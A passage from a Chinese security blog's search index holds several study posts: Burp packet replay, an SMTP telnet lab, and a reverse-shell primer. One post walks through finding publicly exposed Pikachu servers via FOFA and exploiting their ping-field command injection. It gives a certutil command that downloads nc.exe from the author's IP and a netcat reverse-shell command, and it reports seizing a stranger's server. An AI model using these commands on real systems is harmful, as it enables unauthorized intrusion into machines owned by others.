src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9025310b3400c30f0a7a3df0b991b94d.png" alt="9025310b3400c30f0a7a3df0b991b94d"></p><p>点赞后，抓取数据包，不停的转发数据包，可以发现点赞数一直在上升</p><h3 id="2-请求包-修改UA头"><a href="#2-请求包-修改UA头" class="headerlink" title="2.请求包-修改UA头"></a>2.请求包-修改UA头</h3><p>有时候电脑不能访问到手机的某些页面，即某些网页只针对于手机界面，此时可以通过burp修改数据包请求头（UA）使得电脑浏览器能够访问到手机界面，进而进行一些操作</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 架构建设 </tag>
            
            <tag> 代理服务器 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> HTTP数据包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网实验-实现SMTP发送邮件</title>
      <link href="/post/66fb5f37.html"/>
      <url>/post/66fb5f37.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-启动Windows的telnet服务"><a href="#0x0-启动Windows的telnet服务" class="headerlink" title="0x0.启动Windows的telnet服务"></a>0x0.启动Windows的telnet服务</h2><p>如下图所示，用命令行启动telnet服务，telent需要在windows设置中打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084015.png" alt=""></p><h2 id="0x1-打开QQ邮箱的SMTP服务"><a href="#0x1-打开QQ邮箱的SMTP服务" class="headerlink" title="0x1.打开QQ邮箱的SMTP服务"></a>0x1.打开QQ邮箱的SMTP服务</h2><p>QQ邮箱的SMTP服务是默认关闭的，故需要我们手动打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084227704.png" alt="image-20240401084227704"></p><h2 id="0x2-输入telnet-smtp-qq-com-25"><a href="#0x2-输入telnet-smtp-qq-com-25" class="headerlink" title="0x2.输入telnet smtp.qq.com 25"></a>0x2.输入telnet smtp.qq.com 25</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084454941.png" alt="image-20240401084454941"></p><p>服务器返回220，表示已经与服务器连接成功</p><h2 id="0x3-登录自己的邮箱账户"><a href="#0x3-登录自己的邮箱账户" class="headerlink" title="0x3.登录自己的邮箱账户"></a>0x3.登录自己的邮箱账户</h2><h3 id="输入helo-qq-com-向服务器表明身份"><a href="#输入helo-qq-com-向服务器表明身份" class="headerlink" title="输入helo qq.com,向服务器表明身份"></a>输入helo qq.com,向服务器表明身份</h3><p>返回250 ok，表明SMTP服务器有能力接收邮件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084919.png" alt=""></p><p>输入auth login，登录账户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085053018.png" alt="image-20240401085053018"></p><p>返回 334 VXNlcm5hbWU6，拿去Base64解码，发现是Username：</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085403195.png" alt="image-20240401085403195"></p><p>说明这是密文传输，提醒我们要将自己的用户名和密码也用Base64加密后进行传输</p><h3 id="输入邮箱的base64编码"><a href="#输入邮箱的base64编码" class="headerlink" title="输入邮箱的base64编码"></a>输入邮箱的base64编码</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085633318.png" alt="image-20240401085633318"></p><h3 id="输入授权码"><a href="#输入授权码" class="headerlink" title="输入授权码"></a>输入授权码</h3><p>授权码在开启SMTP服务时系统会给你一个授权码，<strong>注意：这里不是输自己QQ邮箱的密码！！！不是自己QQ邮箱的密码！！！</strong>，如果显示连接不上，多试几次，可能很大一部分原因是服务器繁忙</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092432509.png" alt="image-20240401092432509"></p><p>出现如上，表明登录成功，可以开始和服务器进行交互了</p><h2 id="0x4-实验各种命令进行发邮件"><a href="#0x4-实验各种命令进行发邮件" class="headerlink" title="0x4.实验各种命令进行发邮件"></a>0x4.实验各种命令进行发邮件</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092705247.png" alt="image-20240401092705247"></p><p>发现在输入收件人邮箱时一直出现502状态码，后查询资料，发现不能使用常见的25端口，要使用经常加密的587端口，后续将端口换成587，重复上述操作。</p><p>输入以下图片上的命令</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092840797.png" alt="image-20240401092840797"></p><p>得到相关的结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092914047.png" alt="image-20240401092914047"></p><p>实验至此结束</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> SMTP </tag>
            
            <tag> pop3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战案例-Fofa拿下pikachu服务器（文件上传下载&amp;webshell）</title>
      <link href="/post/b9d95899.html"/>
      <url>/post/b9d95899.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li>本博客仅用于个人复习和学习，无商业用途</li><li>遇到问题，优先在本页搜索，检查是否有相关教程</li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0-实验需要"><a href="#0-实验需要" class="headerlink" title="0.实验需要"></a>0.实验需要</h2><ol><li>一台自己的服务器</li><li>netcat工具（瑞士军刀）</li><li>能动手操作的决心，不怕困难的决心</li></ol><h2 id="1-打开FOFA"><a href="#1-打开FOFA" class="headerlink" title="1.打开FOFA"></a>1.打开FOFA</h2><h3 id="FOFA是什么？"><a href="#FOFA是什么？" class="headerlink" title="FOFA是什么？"></a>FOFA是什么？</h3><p>FOFA是一款网络空间测绘的搜索引擎，旨在帮助用户以搜索的方式查找公网上的互联网资产。简单来说，FOFA的使用方式类似于谷歌或百度，用户可以输入关键词来匹配包含该关键词的数据。不同的是，这些数据不仅包括像谷歌或百度一样的网页，还包括像摄像头、打印机、数据库、操作系统等资产。</p><p>网络空间测绘可以被认为是网络空间的“地图”。就像谷歌地图或高德地图通过卫星图像对地形进行测绘，网络空间测绘也是通过技术探针对全球网络资产进行探测。</p><p>然而，网络空间分为公网和内网。FOFA主要针对公网上的资产进行探测，类似于谷歌地图上的建筑物（IP地址），虽然可以看到建筑物的外部结构和规模，但无法了解内部的情况。这是因为侵犯内网的隐私是违法的。（懂的都懂👀）</p><p>快速通道👉<a href="https://fofa.info/">FOFA</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331163505752.png" alt="FOFA主界面"></p><center>FOFA主界面</center><h2 id="2-查找pikachu服务器"><a href="#2-查找pikachu服务器" class="headerlink" title="2.查找pikachu服务器"></a>2.查找pikachu服务器</h2><p>在搜索框中输入以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;pikachu&quot;</span>&amp;&amp;country=<span class="string">&quot;CN&quot;</span>&amp;&amp;title==<span class="string">&quot;Get the pikachu&quot;</span></span><br></pre></td></tr></table></figure><p>随机选择一个服务器进入，点击侧边栏RCE下拉框，找到exec”ping”，点击进入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/%7BD3E49BC8-61EB-4eec-AD69-14614714C341%7D.png" alt="{D3E49BC8-61EB-4eec-AD69-14614714C341}"></p><p>在ping框中输入127.0.0.1并执行，检测服务器是否能够执行命令，当出现以下页面时，说明该服务器不能执行命令，需要重新更换一个服务器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331165457614.png" alt="image-20240331165457614"></p><p>直至出现以下页面，说明有我们想要的代码执行漏洞存在（可能找的过程会比较漫长，请保持耐心🤡）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171346526.png" alt="image-20240331171346526"></p><h2 id="3-查看服务器ip地址"><a href="#3-查看服务器ip地址" class="headerlink" title="3.查看服务器ip地址"></a>3.查看服务器ip地址</h2><p>输入127.0.0.1&amp;ipconfig或者127.0.0.1&amp;ifconfig进行查看ip地址，如果服务器是windows操作系统，则为127.0.0.1&amp;ipconfig；如果为linux操作系统，则为127.0.0.1&amp;ifconfig，返回如下界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171904747.png" alt="image-20240331171904747"></p><p>说明服务器ip地址为10.0.12.10</p><h2 id="4-查看服务器文件夹"><a href="#4-查看服务器文件夹" class="headerlink" title="4.查看服务器文件夹"></a>4.查看服务器文件夹</h2><p>输入127.0.0.1&amp;dir查看服务器文件夹</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331172219218.png" alt="image-20240331172219218"></p><h2 id="5-执行文件下载命令"><a href="#5-执行文件下载命令" class="headerlink" title="5.执行文件下载命令"></a>5.执行文件下载命令</h2><p>将nc.exe放在自己的服务器根目录（wwwroot/My_blog）下，这里我的服务器是使用的宝塔界面（按自己实际需求来）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173827166.png" alt="image-20240331173827166"></p><p>当访问47.109.189.205（我服务器的公网ip）时，会自动下载nc.exe，如下图测试所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173648842.png" alt="image-20240331173648842"></p><p>这里出现无法下载是因为我的edge拦截了nc.exe，所以测试仍然成功</p><p>在pikachu服务器上执行自动下载的命令，相关的命令可以去<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* (ywhack.com)</a>上搜索</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331174137541.png" alt="image-20240331174137541"></p><p>接着去pikachu服务器上执行生成的命令，从我的服务器上下载nc.exe，并命名为1.exe</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;certutil.exe -urlcache -split -f http://<span class="number">47</span>.<span class="number">109</span>.<span class="number">189</span>.<span class="number">205</span>:<span class="number">80</span>/nc.exe <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure><p>额。。。。。。由于做到一半，别人把服务器关了，我又找不到第二个有该漏洞的服务器，所以以下图片源自网络，如有侵权，请联系我删除</p><p>输入127.0.0.1&amp;dir，发现出现1.exe,所以成功让服务器下载到nc.exe</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181603800.png" alt="image-20240331181603800"></p><h2 id="6-在本地服务器上开启监听"><a href="#6-在本地服务器上开启监听" class="headerlink" title="6.在本地服务器上开启监听"></a>6.在本地服务器上开启监听</h2><p>输入nc -lvvp 5566，开放5566端口进行监听</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181734111.png" alt="image-20240331181734111"></p><h2 id="7-反弹回显，拿到pikachu服务器控制权"><a href="#7-反弹回显，拿到pikachu服务器控制权" class="headerlink" title="7.反弹回显，拿到pikachu服务器控制权"></a>7.反弹回显，拿到pikachu服务器控制权</h2><p>输入127.0.0.1 &amp; 1.exe -e cmd 47.109.189.205 5566（47.109.189.205为自己服务器的ip），拿到服务器的控制权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331182108462.png" alt="image-20240331182108462"></p><font color ='red'>虽然拿到服务器控制权，但是不要搞破坏，学习为主。</font>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 文件上传下载 </category>
          
          <category> 实战训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-操作系统安全&amp;&amp;基础名词解释&amp;&amp;反弹Shell</title>
      <link href="/post/235b7e6b.html"/>
      <url>/post/235b7e6b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>渗透入门，第一步先要了解基础名词，以方便我们在阅读各种文章的时候能清楚的知道在干什么，便于我们更好地了解到操作究竟是什么。以下是一些常见的有关操作系统和防火墙的基础名词</p><ul><li>POC：全称“Proof of Concept”，中文“概念验证”，常指一段漏洞的证明代码</li><li>EXP：“Exploit”，中文“利用”指利用漏洞进行攻击的动作</li><li>Payload：“有效载荷”，指成功exploit后，真正在目标系统执行的代码或指令</li><li>Shellcode：漏洞的利用代码，和POC类似</li><li>Webshell：专门针对于Web的后门</li><li>木马：属于恶意程序，主要针对于控制电脑</li><li>病毒：属于恶意程序，主要用来破坏系统</li><li>反弹/回显：当你拿到一个权限，可以将权限移到其他设备，将它反弹过去</li><li>跳板：中介的意思，打个比方，我是A，我想认识C，但是我只认识B，那么我可以通过B去认识C，就是说A通过B以B为跳板去认识到C</li><li>黑白盒测试：黑盒测试除目标外，什么都没有；白盒测试是网上有相关的源码，可以通过源码进行分析，从而进行渗透</li><li>撞库：撞库就是网上泄露出来的一些数据库，那么这些数据库中有真实明显和密码等，那么可以通过对数据库的收集查询，去查询有没有这个人，看看他以前设置过什么密码，看看他这个密码到底是什么含义，然后我们再尝试去其他每天以他账户去和密码登录看有没有能成功的</li><li>ATT&amp;CK：<a href="https://attack.mitre.org/matrices/enterprise/">Matrix - Enterprise | MITRE ATT&amp;CK®</a>（一些网络术语的集合的网站，个人强推）</li></ul><h2 id="操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙"><a href="#操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙" class="headerlink" title="操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙"></a>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</h2><h3 id="WIndows-amp-Linux常见命令："><a href="#WIndows-amp-Linux常见命令：" class="headerlink" title="WIndows&amp;Linux常见命令："></a>WIndows&amp;Linux常见命令：</h3><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">【3】web安全入门篇-渗透测试中常用的命令_web安全入门篇 渗透测试中常用的命令-CSDN博客</a></p><p>Waf：Web Application FireWall，专门针对于Web的防火墙</p><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="1-文件上传下载-解决无图形化-amp-解决数据传输"><a href="#1-文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="1.文件上传下载-解决无图形化&amp;解决数据传输"></a>1.文件上传下载-解决无图形化&amp;解决数据传输</h3><p>相关命令的生成网站：<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Linux ：wget curl python ruby perl java等</span><br><span class="line">Windows: PowerShell Certutil Bitsadmin msiexec</span><br></pre></td></tr></table></figure><h3 id="2-反弹Shell命令-解决数据回显-amp-解决数据通信"><a href="#2-反弹Shell命令-解决数据回显-amp-解决数据通信" class="headerlink" title="2.反弹Shell命令-解决数据回显&amp;解决数据通信"></a>2.反弹Shell命令-解决数据回显&amp;解决数据通信</h3><p>目的：解决交互式命令无回显的情况，部分交互式活动需要回显才能进行下一步操作</p><h3 id="3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器"><a href="#3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器" class="headerlink" title="3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h3><p>正向连接：受害主机监听一个端口，由控制主机主动去连接受害主机的过程</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113811332.png" alt="image-20240331113811332"></p><p>即：<font color="red">攻击机主动连接被攻击机</font></p><p>反向连接：反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113906001.png" alt="image-20240331113906001"></p><p>即：<font color="red">被攻击者主动连接攻击机</font></p><p>内网服务器：只需要知道内网中的主机可以找到服务器（ping成功），服务器找不到内网中的主机（因为不同的内网中的地址可能是一样的，服务器无法甄别）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331114058029.png" alt="image-20240331114058029"></p><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p>Fofa拿下Pikachu服务器：详情见下一篇博客<a href="http://www.hackborgeous.top/post/b9d95899.html">实战案例-Fofa拿下pikachu服务器（文件上传下载&amp;webshell） | Borgeousのblog (hackborgeous.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统安全 </tag>
            
            <tag> 防火墙绕过 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
